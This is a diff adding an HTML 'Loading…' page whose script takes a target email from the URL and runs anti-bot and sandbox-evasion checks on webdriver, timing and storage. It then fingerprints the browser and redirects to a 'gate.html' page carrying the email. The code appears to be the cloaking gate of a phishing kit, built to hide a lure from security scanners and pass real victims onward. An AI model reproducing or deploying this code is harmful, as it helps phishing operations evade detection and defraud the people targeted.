@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Loading…</title>
+<script>
+(async () => {
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("print");
+
+  if (!email) {
+    document.body.innerText = "Invalid request";
+    return;
+  }
+
+  /* ───── BASIC BOT KILLS ───── */
+  if (
+    !navigator.userAgent ||
+    navigator.webdriver ||
+    !window.crypto ||
+    !window.crypto.subtle ||
+    !navigator.languages ||
+    navigator.languages.length === 0
+  ) {
+    return;
+  }
+
+  /* ───── TIMING ENTROPY ───── */
+  const start = performance.now();
+  await new Promise(r => setTimeout(r, 800 + Math.random() * 1200));
+  if (performance.now() - start < 700) return;
+
+  /* ───── STORAGE TEST ───── */
+  try {
+    localStorage.setItem("k", "1");
+    sessionStorage.setItem("k", "1");
+  } catch {
+    return;
+  }
+
+  /* ───── CRYPTO TOKEN ───── */
+  const enc = new TextEncoder();
+  const raw = enc.encode(
+    navigator.userAgent +
+    screen.width +
+    screen.height +
+    email +
+    Date.now()
+  );
+
+  const hash = await crypto.subtle.digest("SHA-256", raw);
+  const token = Array.from(new Uint8Array(hash))
+    .map(b => b.toString(16).padStart(2, "0"))
+    .join("");
+
+  /* ───── PASS TO SERVER ───── */
+  window.location.href =
+    "gate.html?token=" + token + "&print=" + encodeURIComponent(email);
+
+})();
+</script>
+</head>
+<body>
+</body>
+</html>
